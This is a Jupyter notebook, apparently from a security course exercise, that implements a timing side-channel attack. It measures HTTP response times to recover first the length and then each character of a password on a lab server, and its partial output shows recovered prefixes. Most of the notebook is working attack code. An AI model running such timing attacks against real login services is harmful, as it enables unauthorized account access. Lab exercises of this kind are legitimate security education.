In [120]:

from functools import partial
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import os
import timeit
import numpy as np
import requests
import httpx
import urllib3
import pycurl
from io import BytesIO
import socket
import subprocess
import json
import subprocess
import threading

In [218]:
import subprocess
import threading
from concurrent.futures import ThreadPoolExecutor


class CurlWorker:
    def __init__(self):
        self.p = subprocess.Popen(
            ["curl", "-s", "--no-progress-meter"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1
        )
        self.lock = threading.Lock()  # avoid mixed writes

    def get(self, url: str) -> str:
        with self.lock:
            self.p.stdin.write(url + "\n")
            self.p.stdin.flush()
            return self.p.stdout.readline().strip()


class CurlPool:
    def __init__(self, size=26):
        self.workers = [CurlWorker() for _ in range(size)]
        self.size = size
        self.i = 0
        self.lock = threading.Lock()

    def acquire(self) -> CurlWorker:
        with self.lock:
            w = self.workers[self.i]
            self.i = (self.i + 1) % self.size
            return w

    def fetch(self, url: str) -> str:
        return self.acquire().get(url)


In [219]:
# server_ip = "132.72.81.37"
server_ip = "127.0.0.1"
username="206784290"
difficulty="1"
format="http://{}?user={}&password={}&difficulty={}"
retries=10
password_chars="abcdefghijklmnopqrstuvwxyz"
max_password_length=32
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}
timeout=(3000, 3000)
socket.setdefaulttimeout(None)

In [220]:
class CorrectException(Exception):
    """
    If we by mistake hit the correct password we want to know it.
    This is because if we hit the correct password the server might early return for us.
    Also if we hit the correct password we can stop trying.
    So we abuse the exception mechanisem to fast return to main.
    """
    pass

In [221]:
def curl_call(url: str) -> str:
    proc = subprocess.Popen(
        ["curl", "-s", url],          # NO TIMEOUT FLAGS
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    out, _ = proc.communicate()       # NO timeout= argument
    return out.decode().strip()

In [ ]:
#we want to reuse the connections in order to save time on running the 3 way handshake
# deprecated
sessions = dict()
for c in password_chars:
    session = requests.Session()
    # session.trust_env = False
    session.verify = False
    session.headers.update({"Connection": "keep-alive"})
    sessions[c]= session

In [ ]:
def try_password(password: str) -> None:
    """
    :param password: A password to try.
    Return: None, we only care about the time.
    Throws: CorrectException if correct, we want to stop as soon as we hit the correct password
    """

    url = format.format(server_ip, username, password, difficulty)

    result = curl_call(url)
    if "1" == result:
        raise CorrectException(password)

In [224]:
def time_candidate(candidate: str, repeats: int) -> int:
    total = 0
    for _ in range(repeats):
        t0 = time.perf_counter_ns()
        try_password(candidate)
        total += time.perf_counter_ns() - t0
    return total

In [240]:
def find_length() -> int:
    """
    Uses a timeing attack to find the length of the password.

    Return: The length of the password.
    """

    password = ""
    single_char = password_chars[0]
    tries = [
    time_candidate((i+1)*single_char, retries)
    for i in range(max_password_length)
    ]
    return np.argmax(tries) + 1


In [241]:
def find_next_char(start_password,padding) -> str:
    """
    Finds the next correct char in the password.

    :param start_password: The starting chars of the password.
    Return: The next char in the password.
    """

    tries = dict()
    for char in password_chars:
        tries[char]=time_candidate(start_password + char + padding, retries)
        
    return max(tries, key=tries.get)

In [242]:
def _crack() -> None:
    """
    Cracks the password.

    Throws: The correct password
    """
    length = find_length()
    print(length)
    password = ""
    pad = password_chars[0]
    padding = pad * length
    for _ in range(length):
        password += find_next_char(password,padding[0:length-len(password)-1])
        print(password)

In [243]:
def crack() -> str | None:
    """
    Return: password on success or None otherwise.
    """
    try:
        _crack()
        return None
    except CorrectException as password:
        return password.args[0]

In [ ]:
while True:
    start = time.time()
    password = crack()
    if password is not None:
        print(password)
        end = time.time()
        print(end-start)
        break

16
q
qz


In [ ]:
!curl -s -w '\nTime:\t%{time_total}\n' -o - http://132.72.81.37\?user=123\&password=NaNaKaNaNa\&difficulty=1